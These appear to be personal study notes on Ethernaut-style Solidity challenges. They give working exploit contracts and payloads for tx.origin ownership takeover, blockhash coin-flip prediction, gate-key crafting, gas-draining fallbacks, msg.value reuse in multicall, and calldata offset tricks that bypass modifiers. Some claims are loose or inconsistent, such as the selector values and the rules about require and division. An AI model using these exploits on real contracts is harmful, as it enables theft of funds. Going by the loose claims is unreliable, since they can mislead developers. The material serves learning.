# DAY 1

# 1.

The issue with tx.origin in smart contracts is that it can lead to security vulnerabilities, such as allowing unauthorized access or manipulation of contracts. This is because tx.origin returns the original sender of the transaction, which can be exploited in certain attack scenarios

tx.origin refers to the original sender of a transaction, while msg.sender refers to the immediate sender of a message within a contract. The key distinction lies in the fact that tx.origin represents the external account that initiated the transaction, whereas msg.sender represents the contract that is executing the code.

If contract X calls Y, and Y calls Z, in Z msg.sender is Y and tx.origin is X.

example // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }

}

contract Exploit{

    Telephone telephone = Telephone(0x8a4219227eaAf59218a662863696bfbbf3E4aF7A);

    function exploit()public{
    telephone.changeOwner(msg.sender);
    }

}

# 2.

A simple coin flip game where users can guess the outcome of a coin flip.

- Issues,never use blockhash, or any publicly available parameter for randomness in production contracts.
- To solve this quest a separate contract will be used to calculate and call the flip function on behalf of the hacker

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlipCoin {
function consecutiveWins() external view returns (uint256);
function flip(bool \_guess) external returns (bool);
}

contract EthernautFlipCoint {
IFlipCoin s_flipCoin = IFlipCoin(0xdca01d8dD987B37D22F401aC0Bc0EacEe598EE44); // instance of the deployed CoinFlip contract
uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event FlipResult(uint256 indexed consecutiveWinsCount);

    function makeCorrectGuess() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool correctSide = coinFlip == 1 ? true : false;
        s_flipCoin.flip(correctSide); // calling on behalf of the hacker
        uint256 consecutiveWinsCount = s_flipCoin.consecutiveWins();
        emit FlipResult(consecutiveWinsCount);
    }

}

contract CoinFlip {
uint256 public consecutiveWins;
uint256 lastHash;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) { // basically the secret for determining the correct flip side
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false; // ALL THESE CAN BE COMPUTATED INDEPENDENTLY TO ALWAYS ARRIVE AT THE CORRECT OUTCOME

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }

}

# 3.

Integer Overflow:
This happens when a number exceeds the maximum value allowed by its data type and “wraps around” to start from the minimum value.

For example:

uint8 max = 255; // Max value for uint8
uint8 result = max + 1; // Overflow: result is 0
Integer Underflow:
Conversely, underflow happens when a number goes below the minimum value and wraps around to the maximum value.

For example:

uint8 min = 0; // Min value for uint8
uint8 result = min - 1; // Underflow: result is 255

# 4.

What is Delegatecall?
Delegatecall is a low-level function in Solidity that enables a contract (caller) to invoke a function in another contract (callee) in such a way that the callee’s code is executed in the context of the caller. This means that while the code of the callee contract is used, the storage, current address, and balance of the caller contract are utilized. This feature is particularly useful for creating proxy contracts and implementing contract upgrade patterns.
basically
Contract A can execute code from Contract B
Contract B code is executed but all state changes affect A

TL;DR "Other libraries, contracts, do what everything you want with my state" -- should be access control locked

Vulnerabilities Introduced by Delegatecall
State Variable Collisions: The most common vulnerability arises from state variable collisions. Since Delegatecall runs the callee’s code in the caller’s context, any manipulation of state variables by the callee affects the caller’s state. If the layout of state variables in the callee does not precisely match that in the caller, unintended modifications to the caller’s state can occur, leading to unpredictable behavior or exploitation.
Unintended Authority Granting: Delegatecall transfers execution control to the callee contract, potentially leading to situations where the callee unexpectedly gains the ability to perform critical operations on behalf of the caller, such as transferring tokens, changing ownership, or altering permissions.
Logic Errors and Attacks: The flexibility of Delegatecall can also inadvertently introduce logic errors or make the contract susceptible to reentrancy attacks if not carefully managed, especially when interacting with untrusted contracts.

Remember that in Ethereum, you can invoke a public function by sending data in a transaction. The format is as follows:

contractInstance.call(bytes4(sha3("functionName(inputType)"))

contractInstance.call(abi.encodeWithSignature(...))

# 5.

A fallback function in Solidity is a special function that is executed when a contract receives Ether without any data or when a function that does not exist is called

# DAY 2

# 6.

Don’t use transfer() or send() because they can cause your contract to be incompatible with many legitimate recipients and are vulnerable to future gas cost changes. Always use call() with proper checks and reentrancy guards.​​​​​​​​​​​​​​​​
send() fails silently and both forward 2300 gas, may not be sufficient

# 7.

Always check result when using call, cause they forward all available gas (recipe for reentrancy ) low level calls ie call, callcode, delegatecall, send
all return a false instead of throwing an exception

# 8.

but why does a revert from another contract affect the execution of the contract that initiates the execution, rather a boolean would suffice instead revert makes it unusable, dont use require(success) rather if(success)
require means pass or revert, boolean gives more

# 9.

_libA.delegatecall(abi.encodeWithSignature("pwn()")); basically borrows the code of contract A and execute it in context of the calling contract B, changing B’s state
Never trust user input in delegatecall

# 10.

Ethere can be forcefully sent to a contract either by a. selfdestruct, b. sending to the contract before it exists

# 11.

# Solidity Data Types + Masking & Bytes-Counting Explained (Visually)

Below is a complete reference that covers:

1. A **Solidity data types table** (bit, byte, and hex sizes).
2. A **visual deep-dive** into masking and byte-counting using the `GatekeeperOne` example:
   ```solidity
   require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
   require(uint32(uint64(_gateKey)) != uint64(_gateKey));
   require(uint32(uint64(_gateKey)) == uint16(tx.origin));
   ```

---

## 1️⃣ Solidity Data Types Table

| Category                | Type                  | Bits    | Bytes         | Hex Digits    | Storage / Encoding Notes                                             |
| ----------------------- | --------------------- | ------- | ------------- | ------------- | -------------------------------------------------------------------- |
| **Value**               | `bool`                | 8       | 1             | 2             | `0x00` or `0x01`; can be packed with other small types.              |
|                         | `uint8`               | 8       | 1             | 2             | Unsigned integer.                                                    |
|                         | `uint16`              | 16      | 2             | 4             | Unsigned integer.                                                    |
|                         | `uint32`              | 32      | 4             | 8             | Unsigned integer.                                                    |
|                         | `uint64`              | 64      | 8             | 16            | Unsigned integer.                                                    |
|                         | `uint128`             | 128     | 16            | 32            | Unsigned integer.                                                    |
|                         | `uint256`             | 256     | 32            | 64            | Unsigned integer; full EVM word.                                     |
|                         | `int8` … `int256`     | 8–256   | 1–32          | 2–64          | Signed (two's complement).                                           |
|                         | `address`             | 160     | 20            | 40            | Stored right-aligned in 32 bytes(padded left when read as 32 bytes). |
|                         | `bytes1` … `bytes32`  | 8–256   | 1–32          | 2–64          | Fixed-size byte arrays; occupy up to one slot.                       |
| **Fixed**               | `enum`                | ≤256    | ≤32           | ≤64           | Backed by `uint8` by default (can grow if many members).             |
| **Dynamic / Reference** | `bytes`               | dynamic | dynamic       | dynamic       | Slot stores length/pointer; data stored elsewhere.                   |
|                         | `string`              | dynamic | dynamic       | dynamic       | Same as `bytes`.                                                     |
|                         | `T[]` (fixed array)   | depends | elements × 32 | elements × 64 | Each element occupies a 32-byte cell.                                |
|                         | `T[]` (dynamic array) | dynamic | dynamic       | dynamic       | One slot holds length; elements start at `keccak(slot)`.             |
|                         | `mapping(K => V)`     | dynamic | dynamic       | dynamic       | No sequential layout; value slot = `keccak(key . slot)`.             |
| **EVM Fact**            | Storage slot          | 256     | 32            | 64            | Every slot = 32 bytes; small types can pack together.                |

---

## 2️⃣ Masking & Byte Counting — Concept

### What is Masking?

- **Masking** = keeping only specific bits of a value.

  - Example: `x & 0xFFFF` keeps only the **lowest 16 bits**.
  - Example: `x & 0xFFFFFFFF` keeps only the **lowest 32 bits**.

### Casting = Masking

- In Solidity, casting to a smaller type truncates the high bits — equivalent to a mask.

  - `uint16(x)` → `x & 0xFFFF`
  - `uint32(x)` → `x & 0xFFFFFFFF`

### Byte Counting

- 1 byte = 8 bits.
- So:

  - `uint16` = 2 bytes = 16 bits → mask `0xFFFF`
  - `uint32` = 4 bytes = 32 bits → mask `0xFFFFFFFF`
  - `uint64` = 8 bytes = 64 bits

---

## 3️⃣ GatekeeperOne Example (Step-by-Step Visual)

### The code

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
require(uint32(uint64(_gateKey)) != uint64(_gateKey));
require(uint32(uint64(_gateKey)) == uint16(tx.origin));
```

---

### Step 1 — Understanding the Widths

- `_gateKey` is `bytes8` → 8 bytes = 64 bits.
- `uint64(_gateKey)` → full 64-bit number.
- `uint32(uint64(_gateKey))` → lower 4 bytes.
- `uint16(uint64(_gateKey))` → lower 2 bytes.

---

### Step 2 — Visualize the Bytes

```
0x B7 B6 B5 B4  B3 B2 B1 B0
```

| Index | Meaning                         |
| ----- | ------------------------------- |
| B7–B4 | high 4 bytes (most significant) |
| B3–B0 | low 4 bytes (least significant) |

Example:

```
_gateKey = 0xDEADBEEF00001234
          [DE][AD][BE][EF] [00][00][12][34]
```

---

### Step 3 — What the Casts Do

| Expression                 | Mask Equivalent | Result               |
| -------------------------- | --------------- | -------------------- |
| `uint64(_gateKey)`         | —               | `0xDEADBEEF00001234` |
| `uint32(uint64(_gateKey))` | `& 0xFFFFFFFF`  | `0x00001234`         |
| `uint16(uint64(_gateKey))` | `& 0xFFFF`      | `0x1234`             |

---

### Step 4 — First Require

```solidity
uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
```

Numerically means:

```
(0xDEADBEEF00001234 & 0xFFFFFFFF) == (0xDEADBEEF00001234 & 0xFFFF)
```

This is true only if **the middle 16 bits (bits 16–31)** are `0x0000`.

So the lower 4 bytes look like:

```
0x0000XXXX
```

---

### Step 5 — Second Require

```solidity
uint32(uint64(_gateKey)) != uint64(_gateKey)
```

Means:

> The 64-bit number is **not equal** to its lower 4 bytes.

So the top 4 bytes (bits 32–63) must **not all be zero**.

```
[ NONZERO ][ 0000XXXX ]
```

---

### Step 6 — Third Require

```solidity
uint32(uint64(_gateKey)) == uint16(tx.origin)
```

- The low 4 bytes of `_gateKey` = `0x0000XXXX`
- The low 2 bytes of `tx.origin` = `XXXX`

Thus, lower 4 bytes of `_gateKey` = `0x0000` + (last 2 bytes of your wallet address).

---

### ✅ Combined Structure

| Byte Range | Meaning                     |
| ---------- | --------------------------- |
| 7–4        | Non-zero (any value)        |
| 3–2        | 0x00 0x00                   |
| 1–0        | last 2 bytes of `tx.origin` |

In hex:

```
_gateKey = 0x????????0000XXXX
```

- `????????` = any non-zero upper 4 bytes
- `XXXX` = last 2 bytes of your wallet address

---

### Example

If your address ends with `0x...1234`,
then a valid `_gateKey` could be:

```
0xDEADBEEF00001234
```

---

### Step 7 — Numeric Verification

| Expression                 | Value                | Explanation           |
| -------------------------- | -------------------- | --------------------- |
| `uint64(_gateKey)`         | `0xDEADBEEF00001234` | full 64 bits          |
| `uint32(uint64(_gateKey))` | `0x00001234`         | lower 4 bytes         |
| `uint16(uint64(_gateKey))` | `0x1234`             | lower 2 bytes         |
| `uint16(tx.origin)`        | `0x1234`             | wallet's last 2 bytes |

Checks:

1. ✅ `uint32 == uint16` → `0x00001234 == 0x1234`
2. ✅ `uint32 != uint64` → upper bits non-zero
3. ✅ `uint32 == uint16(tx.origin)` → matches wallet

---

## 4️⃣ Bitmask Summary

| Type     | Mask                 | Bytes | Description        |
| -------- | -------------------- | ----- | ------------------ |
| `uint8`  | `0xFF`               | 1     | keeps last byte    |
| `uint16` | `0xFFFF`             | 2     | keeps last 2 bytes |
| `uint32` | `0xFFFFFFFF`         | 4     | keeps last 4 bytes |
| `uint64` | `0xFFFFFFFFFFFFFFFF` | 8     | keeps last 8 bytes |

Casting = applying the corresponding mask.

---

## 5️⃣ Solidity / JS Helper Code

**Solidity Example**

```solidity
function parts(uint64 k) external pure returns (uint64 full, uint32 low32, uint16 low16, uint32 high32) {
    full = k;
    low32 = uint32(k);          // k & 0xFFFFFFFF
    low16 = uint16(k);          // k & 0xFFFF
    high32 = uint32(k >> 32);   // top 32 bits
}
```

**JavaScript Example (Ethers.js)**

```js
const v = ethers.BigNumber.from("0xDEADBEEF00001234");
const low16 = v.and("0xFFFF");
const low32 = v.and("0xFFFFFFFF");
const high32 = v.shr(32);
```

---

## 6️⃣ TL;DR Summary

- Casting to a smaller type **truncates higher bits** — equivalent to masking.
- `uint32(x) == uint16(x)` means bits 16–31 are zero → lower 4 bytes = `0x0000XXXX`.
- `uint32(x) != uint64(x)` means upper 32 bits are non-zero.
- `uint32(x) == uint16(tx.origin)` ties the lowest bytes to your wallet address.

Final `_gateKey` structure:

```
0x????????0000XXXX
```

where:

- `????????` = any non-zero upper 4 bytes
- `XXXX` = last 2 bytes of your address (`tx.origin`)

---

# 12. 
Inheritance puts parent contract variables at the lowest slots first.

# 13.
Dynamic array can alter slots

Assume codex is declared at slot p = 2. Let B = keccak256(2) (a big 256-bit number).

main equation
keccak256(abi.encode(p)) + index = 0

to point to slot 0 
index = 0 - keccak256(abi.encode(1))

slot X = X - keccak256(abi.encode(p))   ----- BASE FORMULA FOR FINDING SLOTS VIA THE DYNAMIC ARRAY

codex[0] is at storage slot keccak256(abi.encode(1)) + 0

codex[1] is at storage slot keccak256(abi.encode(1)) + 1

codex[i] is at storage slot keccak256(abi.encode(1)) + i

Contract storage (small-index region)
------------------------------------
slot 0  → owner
slot 1  → somethingElse
slot 2  → codex.length     <-- declared slot p (stores length only)
slot 3  → otherVar
slot 4  → moreVars
...    → ...

Array storage area (far away)
------------------------------
slot B + 0  → codex[0]
slot B + 1  → codex[1]
slot B + 2  → codex[2]
...
slot B + k  → codex[k]
...


# 14. 
 // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);

        Way to break this, since .call forwards all the gas, if a gas limit is not specified
        This is different from transfer/send, which forward a fixed 2,300 gas stipend. (may not be sufficient so .call is recommended)
        using that forwarded gas just trigger an endless loop via a fallback 

         fallback() external payable {
        while (true) {}
    }

 # 15.
 Don't rely on msg.value for accounting - it's read-only and persists in delegatecalls
Track actual ETH balance changes:
 When you use delegatecall, msg.value and msg.sender stays the same throughout ALL nested calls!
address(this).delegatecall(data[i]);
               ^^^^^^^^^^^
               No {value: ...} specified!
```

wallet.multicall{value: 0.001 ether}([
    deposit(),                    // data[0]
    multicall([deposit()])        // data[1]
]) /// IT PRATICALLY REUSES THE SAME (msg.value)
```

### **Initial Call**
```
Transaction: 0.001 ETH sent to wallet
msg.value = 0.001 ETH
msg.sender = attacker

**`delegatecall` NEVER transfers ETH!** It only executes code.

---

## 📝 Visual Breakdown
```
┌─────────────────────────────────────────────────────────┐
│ Original Transaction                                    │
│ attacker → wallet.multicall{value: 0.001 ETH}([...])  │
│                                                         │
│ 0.001 ETH transferred ✅                                │
│ msg.value = 0.001 ETH (locked for entire call chain)   │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
        ┌─────────────────────────────────────┐
        │ Outer multicall (depth 0)           │
        │ depositCalled = false               │
        └─────────────────────────────────────┘
                │                 │
                ▼                 ▼
    ┌───────────────────┐  ┌──────────────────────────┐
    │ deposit()         │  │ multicall([deposit()])   │
    │ (via delegatecall)│  │ (via delegatecall)       │
    └───────────────────┘  └──────────────────────────┘
           │                          │
           │                          ▼
           │              ┌────────────────────────────┐
           │              │ Inner multicall (depth 1)  │
           │              │ depositCalled = false      │
           │              │ (NEW scope!)               │
           │              └────────────────────────────┘
           │                          │
           │                          ▼
           │                  ┌───────────────────┐
           │                  │ deposit()         │
           │                  │ (via delegatecall)│
           │                  └───────────────────┘
           │                          │
           ▼                          ▼
    balances[attacker]        balances[attacker]
    += 0.001 ETH              += 0.001 ETH
    (reads msg.value)         (reads SAME msg.value!)
    
    TOTAL: 0.002 ETH credited
    ACTUAL ETH SENT: 0.001 ETH


# 15. 
uint256 withdrawAmount = (delegatedAmount * amount + stakes[msg.sender] - 1)  / stakes[msg.sender];
NEVER USE FLOOR DIVISION
THEY RESULT IN UNDERFLOWS, USE SAFEMATH IF NEED BE

# 16. 
Chainlink feeds can become stale if no new price updates have occurred for a significant period, which may result in outdated or inaccurate price information being used by the protocol. 
The Chainlink interface provides updatedAt and answeredInRound fields specifically to help consumers detect stale or incomplete data, but these are ignored in the current implementation.
Recommended Mitigation: Implement a staleness check in the getPrice function. For example, require that updatedAt is within an acceptable time window (e.g., not older than a configurable threshold) and that answeredInRound >= roundId. If the data is stale, revert or return an error.

# 17. 
0x30c13ade                    // flipSwitch(bytes) selector
0000000000000000000000000000000000000000000000000000000000000020 // offset to data
0000000000000000000000000000000000000000000000000000000000000004 // length of data
20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff() selector

[function selector][offset][length][actual data]
     4 bytes       32 bytes 32 bytes  32 bytes (padded)

Think of it like:
"Hey contract, call flipSwitch()"
"The parameter is located 32 bytes ahead"
"That parameter is 4 bytes long"
"The parameter value is 0x20606e15"

Calling two functions within the same low level call

0x30c13ade                                          // flipSwitch(bytes) selector
0000000000000000000000000000000000000000000000000000000000000060 // new offset (now 0x60)
0000000000000000000000000000000000000000000000000000000000000004 // length of turnSwitchOff
20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff() selector
0000000000000000000000000000000000000000000000000000000000000004 // length of turnSwitchOn
76227e1200000000000000000000000000000000000000000000000000000000 // turnSwitchOn() selector

bytes memory payload = bytes.concat(
  bytes4(keccak256("flipSwitch(bytes)")),         // [0-3]
  bytes32(uint256(0x60)),                         // [4-35] offset to _data (96 bytes)
  bytes32(uint256(4)),                            // [36-67] length of first call
  bytes32(bytes4(keccak256("turnSwitchOff()"))), // [68-99] turnSwitchOff selector
  bytes32(uint256(4)),                            // [100-131] length of second call
  bytes4(keccak256("turnSwitchOn()"))            // [132-135] turnSwitchOn selector (no padding required)
);

// Create the payload bytes
bytes memory payload = bytes.concat(
    // [0x00 - 0x03] Function selector: targetFunction(bytes,bytes)
    bytes4(keccak256("targetFunction(bytes,bytes)")),

    // [0x04 - 0x23] Offset to first dynamic argument (selector1) = 0x40 (64 bytes)
    bytes32(uint256(0x40)),

    // [0x24 - 0x43] Offset to second dynamic argument (selector2 with array) = 0x80 (128 bytes)
    bytes32(uint256(0x80)),

    // - First Dynamic Argument (Selector1) -

    // [0x44 - 0x63] Length of selector1 (4 bytes)
    bytes32(uint256(4)),

    // [0x64 - 0x83] Selector1: function1()
    bytes32(bytes4(keccak256("function1()"))),

    // - Second Dynamic Argument (Selector2 + array) -

    // [0x84 - 0xa3] Length of selector2 payload (4 bytes)
    bytes32(uint256(4)),

    // [0xa4 - 0xc3] Selector2: function2(uint256[])
    bytes32(bytes4(keccak256("function2(uint256[])"))),

    // [0xc4 - 0xe3] Offset to the array data within selector2 payload = 0x20 (32 bytes)
    bytes32(uint256(0x20)),

    // [0xe4 - 0x103] Length of array: 1 element
    bytes32(uint256(1)),

    // [0x104 - 0x123] foo[0] = 42
    bytes32(uint256(42))
);

# 18.

assembly {
    calldatacopy(selector, 68, 4) // ALWAYS checks byte 68!
}
```

It **hardcodes position 68** instead of reading from the offset pointer. This assumes the data will always be at a fixed location.

## How Your Exploit Works

Your payload structure:
```
[0-3]     0x30c13ade              // flipSwitch(bytes) selector
[4-35]    0x0...060               // offset = 96 (points to byte 100!)
[36-67]   0x0...004               // fake length = 4
[68-99]   0x20606e15...           // turnSwitchOff() - MODIFIER READS THIS ✓
[100-131] 0x0...004               // real length = 4  
[132-135] 0x0d9ea16f              // turnSwitchOn() - ACTUAL DATA EXECUTED ✓

# 19. 
The **only** way to bypass modifiers is with `delegatecall` from a different context, or internal calls within the same contract.

# 20.
Furthermore, any contract can fake any error by returning data that matches an error signature, even if the error is not defined anywhere.


# 21.
In order to use low level functions like call, delegatecall, always wrap the contract in the address wrapper, its an address only function ie `address(target).call`


